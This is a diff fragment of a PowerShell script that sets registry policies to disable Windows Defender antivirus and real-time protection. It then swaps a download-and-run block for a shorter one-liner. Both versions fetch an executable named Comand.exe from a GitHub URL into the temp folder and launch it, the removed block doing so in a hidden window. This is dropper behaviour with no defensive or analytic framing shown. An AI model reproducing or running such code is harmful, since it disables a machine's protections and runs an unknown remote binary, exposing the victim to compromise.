@@ -65,18 +65,4 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Nam
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "Real-Time Protection" -ErrorAction SilentlyContinue
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Force
 
-# ===== DOWNLOAD + EXECUTE user.exe =====
-$folder = $env:TEMP
-$url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe"
-$outFile = "$folder\Comand.exe"
-
-try {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $url -OutFile $outFile -UseBasicParsing -ErrorAction Stop
-    if (Test-Path $outFile) {
-        $size = (Get-Item $outFile).Length
-        if ($size -gt 1024) {
-            Start-Process -FilePath $outFile -WindowStyle Hidden
-        }
-    }
-} catch {}
+$p="$env:TEMP\Comand.exe"; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile $p; Start-Process $p
